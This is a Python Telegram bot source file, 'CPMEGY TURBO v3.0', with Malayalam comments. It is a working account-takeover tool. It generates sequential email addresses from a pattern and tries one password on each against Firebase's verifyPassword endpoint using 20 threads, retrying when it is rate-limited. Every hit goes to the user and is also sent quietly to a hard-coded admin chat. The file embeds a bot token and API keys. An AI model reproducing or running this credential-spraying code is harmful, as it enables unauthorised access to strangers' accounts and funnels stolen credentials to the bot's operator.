import telebot
import requests
from telebot import types
from concurrent.futures import ThreadPoolExecutor
from flask import Flask
import os
import time
import re

# --- SERVER ---
app = Flask('')
@app.route('/')
def home(): return "🔥CPMEGY TURBO v3.0 IS ACTIVE!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- CONFIG ---
TOKEN = "8574711169:AAHDqBnr90ZXlfDiEk1rRkb7IdxolPg2YOs"
bot = telebot.TeleBot(TOKEN, threaded=True)
ADMIN_ID = 7212602902 

API_KEYS = {
    "CPM1": "AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA", 
    "CPM2": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
}

# സ്കാൻ സ്റ്റോപ്പ് ചെയ്യാൻ
stop_flags = {}

def login_acc(email, password, version):
    try:
        url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={API_KEYS[version]}"
        r = requests.post(url, json={"email": email, "password": password, "returnSecureToken": True}, timeout=7)
        # IP Block (429) വന്നാൽ കുറച്ചു നേരം വെയിറ്റ് ചെയ്യണം
        if r.status_code == 429:
            time.sleep(5)
            return login_acc(email, password, version)
        return r.json().get('idToken') if r.status_code == 200 else None
    except: return None

# --- START COMMAND ---
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🔍 Turbo Recovery", callback_data="mode_recover"),
        types.InlineKeyboardButton("🛑 Stop Scan", callback_data="stop_scan")
    )
    bot.send_message(message.chat.id, "🔥 **CPMEGY TURBO MASTER v3.0**\n\nChoose Service:", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    cid = call.message.chat.id
    if call.data == "mode_recover":
        msg = bot.send_message(cid, "📧 **Enter Format, Start, End, Pass**\n\nExample:\n`Marko_{7}@gmail.com 0 1000000 Pass123`")
        bot.register_next_step_handler(msg, start_turbo_recovery)
    elif call.data == "stop_scan":
        stop_flags[cid] = True
        bot.send_message(cid, "🛑 Stopping scan...")

# --- NEW TURBO RECOVERY (ANTI-SKIP & HIGH SPEED) ---
def start_turbo_recovery(message):
    cid = message.chat.id
    try:
        parts = message.text.split()
        fmt = parts[0]
        start_num = int(parts[1])
        end_num = int(parts[2])
        pwd = parts[3]
        
        digits_match = re.search(r"\{(\d+)\}", fmt)
        digits = int(digits_match.group(1)) if digits_match else 4
        
        stop_flags[cid] = False
        bot.send_message(cid, f"🚀 **Turbo Scan Started!**\nRange: `{start_num}` to `{end_num}`\nFormat: `{fmt}`")
        
        def run_scan():
            found = 0
            checked = 0
            # ഒരേസമയം 20 അക്കൗണ്ടുകൾ വരെ ചെക്ക് ചെയ്യും (Speed)
            with ThreadPoolExecutor(max_workers=20) as executor:
                for i in range(start_num, end_num + 1):
                    if stop_flags.get(cid): break
                    
                    email = fmt.replace(f"{{{digits}}}", str(i).zfill(digits))
                    
                    # Sequential order ഉറപ്പാക്കാൻ ഓരോന്നായി സബ്മിറ്റ് ചെയ്യും
                    future = executor.submit(login_acc, email, pwd, "CPM2")
                    result = future.result() 
                    
                    checked += 1
                    if result:
                        found += 1
                        bot.send_message(cid, f"✅ **FOUND:** `{email}`\n🔑 Pass: `{pwd}`")
                        bot.send_message(ADMIN_ID, f"💎 CPMEGY HIT: `{email}`:{pwd}")
                    
                    # ഓരോ 500 ചെക്കിംഗിലും സ്റ്റാറ്റസ് കാണിക്കും
                    if checked % 500 == 0:
                        bot.send_message(cid, f"📊 **Progress:** `{checked}` accounts checked...")

            bot.send_message(cid, f"🏁 **Scan Finished!**\nTotal Checked: `{checked}`\nTotal Found: `{found}`")
            
        import threading
        threading.Thread(target=run_scan).start()
        
    except Exception as e:
        bot.send_message(cid, "⚠️ **Error:** Format തെറ്റാണ്! \nExample: `Marko_{7}@gmail.com 0 10000 123456` എന്ന് അയക്കുക.")

# --- ബാക്കിയുള്ള ഫങ്ക്ഷനുകൾ (Bulk/Single Change) നിന്റെ പഴയ കോഡിൽ ഉള്ളത് പോലെ ഇതിന് താഴെ ആഡ് ചെയ്യാം ---

if __name__ == "__main__":
    from threading import Thread
    Thread(target=run_flask).start()
    bot.infinity_polling()
